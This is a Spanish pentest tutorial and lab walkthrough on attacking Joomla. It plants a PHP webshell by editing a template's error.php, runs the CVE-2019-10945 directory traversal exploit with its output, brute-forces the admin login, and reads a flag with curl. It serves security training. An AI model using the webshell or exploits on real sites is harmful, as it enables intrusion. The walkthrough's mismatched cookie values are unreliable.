
# Joomla - Ataques

## <mark style="color:purple;">Atacando a Joomla</mark>

Ahora sabemos que estamos tratando con un sitio de comercio electrónico de Joomla. Si podemos obtener acceso, podremos acceder al entorno interno del cliente y comenzar a enumerar el entorno de dominio interno. Al igual que WordPress y Drupal, Joomla ha tenido su cuota de vulnerabilidades contra la aplicación principal y extensiones vulnerables. Además, al igual que los demás, es posible obtener ejecución de código remoto si podemos iniciar sesión en el backend de administración.

***

## <mark style="color:purple;">Abuso de la funcionalidad incorporada</mark>

Durante la fase de enumeración de Joomla y la búsqueda general de datos de la empresa, podemos encontrarnos con credenciales filtradas que podemos usar para nuestros fines. Con las credenciales que obtuvimos en los ejemplos de la última sección, `admin:admin`, iniciemos sesión en el backend de destino en `http://dev.inlanefreight.local/administrator`. Una vez que hayamos iniciado sesión, podemos ver muchas opciones disponibles. Para nuestros fines, nos gustaría agregar un fragmento de código PHP para obtener RCE. Podemos hacer esto personalizando una plantilla.

Desde aquí, podemos hacer clic en `Templates` en la parte inferior izquierda debajo de  `Configuration` para que aparezca el menú de plantillas:

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_admin.png" alt=""><figcaption></figcaption></figure>

A continuación, podemos hacer clic en el nombre de una plantilla. Elijamos `protostar` debajo del encabezado de la columna `Template`. Esto nos llevará a la página `Templates: Customise`.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_templates.png" alt=""><figcaption></figcaption></figure>

Por último, podemos hacer clic en una página para obtener el código fuente de la misma. Es una buena idea adquirir el hábito de utilizar nombres de archivo y parámetros no estándar para nuestras webshells, de modo que no sean fácilmente accesibles para un atacante "intruso" durante la evaluación. También podemos protegerlos con contraseña e incluso limitar el acceso a nuestra dirección IP de origen. Además, siempre debemos recordar limpiar los webshells tan pronto como terminemos con ellos, pero aún así incluir el nombre de archivo, el hash del archivo y la ubicación en nuestro informe final para el cliente.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_customise.png" alt=""><figcaption></figcaption></figure>

Seleccionemos la página `error.php`. Agregaremos un código PHP de una sola línea para ejecutar el código de la siguiente manera.

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_edited.png" alt=""><figcaption></figcaption></figure>

Una vez dentro, haga clic en `Save & Close` en la parte superior y confirme la ejecución del código usando `cURL`:

```shell-session
afsh4ck@kali$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Desde aquí, podemos actualizar a un reverse shell interactivo y comenzar a buscar vectores de escalada de privilegios locales o centrarnos en el movimiento lateral dentro de la red corporativa. Debemos asegurarnos, una vez más, de anotar este cambio en los apéndices de nuestro informe y hacer todo lo posible para eliminar el fragmento de código PHP de la página `error.php`.

***

## <mark style="color:purple;">Vulnerabilidades conocidas</mark>

En el momento de escribir este artículo, se han detectado [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) vulnerabilidades relacionadas con Joomla que han recibido una CVE. Sin embargo, el hecho de que una vulnerabilidad haya sido divulgada y haya recibido una CVE no significa que sea explotable o que exista un exploit PoC público disponible. Al igual que con WordPress, las vulnerabilidades críticas (como las de ejecución remota de código) que afectan al núcleo de Joomla son poco frecuentes. Si buscamos en un sitio como `exploit-db` se muestran más de 1400 entradas para Joomla, y la gran mayoría son para extensiones de Joomla.

Analicemos una vulnerabilidad del núcleo de Joomla que afecta a la versión `3.9.4`, que se encontró en nuestro objetivo `http://dev.inlanefreight.local/` durante nuestra enumeración. Al consultar la página [de descargas](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html) de Joomla , podemos ver que la versión `3.9.4` se lanzó en marzo de 2019. Aunque está desactualizada, ya que estamos en Joomla `4.0.3`desde septiembre de 2021, es totalmente posible encontrarse con esta versión durante una evaluación, especialmente en una gran empresa que puede no mantener un inventario de aplicaciones adecuado y desconoce su existencia.

Investigando un poco, encontramos que esta versión de Joomla probablemente sea vulnerable a [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) , que es una vulnerabilidad de eliminación de archivos autenticados y de Path Traversal. Podemos usar [este](https://www.exploit-db.com/exploits/46710) script de explotación para aprovechar la vulnerabilidad y enumerar el contenido del directorio raíz web y otros directorios. La versión python3 de este mismo script se puede encontrar [aquí](https://github.com/dpgg101/CVE-2019-10945) .&#x20;

También podemos usarlo para eliminar archivos (no recomendado). Esto podría llevar al acceso a archivos confidenciales, como un archivo de configuración o un script que contenga credenciales, si luego podemos acceder a él a través de la URL de la aplicación. Un atacante también podría causar daños al eliminar archivos necesarios si el usuario del servidor web tiene los permisos adecuados.

Podemos ejecutar el script especificando los indicadores `--url`, `--username`, `--password` y `--dir`. Como pentesters, esto solo nos resultará útil si el portal de inicio de sesión de administrador no es accesible desde el exterior, ya que, armados con credenciales de administrador, podemos obtener ejecución de código remoto, como vimos anteriormente.

```shell-session
afsh4ck@kali$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       

administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.136.207    dev.inlanefreight.local
```

Aprovecha la vulnerabilidad Directory Traversal para encontrar una flag en el web root de la aplicación Joomla `http://dev.inlanefreight.local/`

### Bruteforce

Vamos a usar el siguiente script para hacer bruteforce de Joomla:

{% embed url="<https://github.com/ajnik/joomla-bruteforce/tree/master>" %}

```shell-session
afsh4ck@kali$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
admin:admin
```

Encontramos las credenciales `admin:admin`

Accedemos al panel de login en:

```
http://dev.inlanefreight.local/administrator/index.php
```

<figure><img src="/files/X4Z03GBuiALOo9B0923r" alt=""><figcaption></figcaption></figure>

La web está rota y no podemos acceder al gestor de archivos, por lo que vamos a probar la vulnerabiilidad de Directory Traversal con el script del módulo:

<pre class="language-shell-session"><code class="lang-shell-session">afsh4ck@kali$ python3 CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin
<strong>
</strong># Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal &#x26;&#x26; Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ &#x3C;| |  | | |  | |  _ &#x3C; 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       

administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
flag_6470e394cbf6dab6a91682cc8585059b.txt
htaccess.txt
index.php
robots.txt
web.config.txt
</code></pre>

Encontramos la flag: `flag_6470e394cbf6dab6a91682cc8585059b.txt`

Al intentar leer la flag con curl no podemos directamente, ya que necesitamos una cookie de sesión. Capturamos una petición de login con BurpSuite y obtenemos datos relevantes:

<figure><img src="/files/NDm1dxD1CZHLRSh0vU6P" alt=""><figcaption></figcaption></figure>

```
POST /administrator/index.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 164
Origin: http://dev.inlanefreight.local
Connection: keep-alive
Referer: http://dev.inlanefreight.local/administrator/index.php?option=com_menus&view=items&menutype=
Cookie: 02a93f6429c54209e06c64b77be2180d=tc9bv08phkl75p1eq4ekuts0li; b3832796fcc06a2991b186374e8f3acf=k0at7dkno67f9sr2p4cc7lg61k
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&passwd=admin&option=com_login&task=login&return=aW5kZXgucGhwP29wdGlvbj1jb21fbWVudXMmdmlldz1pdGVtcyZtZW51dHlwZT0%3D&407e8620caa2db4e557e16e67e87019f=1
```

Vamos a intentar loguearnos con curl de la siguiente manera:

```bash
curl -c cookies.txt -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Origin: http://dev.inlanefreight.local" \
-H "Referer: http://dev.inlanefreight.local/administrator/index.php?option=com_menus&view=items&menutype=" \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
-d "username=admin&passwd=admin&option=com_login&task=login&return=aW5kZXgucGhwP29wdGlvbj1jb21fbWVudXMmdmlldz1pdGVtcyZtZW51dHlwZT0%3D&407e8620caa2db4e557e16e67e87019f=1" \
"http://dev.inlanefreight.local/administrator/index.php"
```

Eso nos genera un archivo `cookies.txt`:

```bash
cat cookies.txt 

# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_dev.inlanefreight.local	FALSE	/	FALSE	0	b3832796fcc06a2991b186374e8f3acf	6s03da2g38bu8vbrtievbesttk
```

La cookie generada sugiere que el login fue exitoso porque ahora tenemos una sesión activa con el valor `b3832796fcc06a2991b186374e8f3acf = 6lmna21i1ieca6pah95nvltchp`. Ahora podemos utilizar esta cookie para realizar solicitudes autenticadas.

{% hint style="info" %}
El servidor podría requerir cabeceras adicionales para autenticar la solicitud
{% endhint %}

```bash
curl -b "b3832796fcc06a2991b186374e8f3acf=6lmna21i1ieca6pah95nvltchp" \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
-H "Referer: http://dev.inlanefreight.local/administrator/" \
"http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt"

j00mla_c0re_d1*****************
```

Obtenemos de esta manera el contenido de la flag!
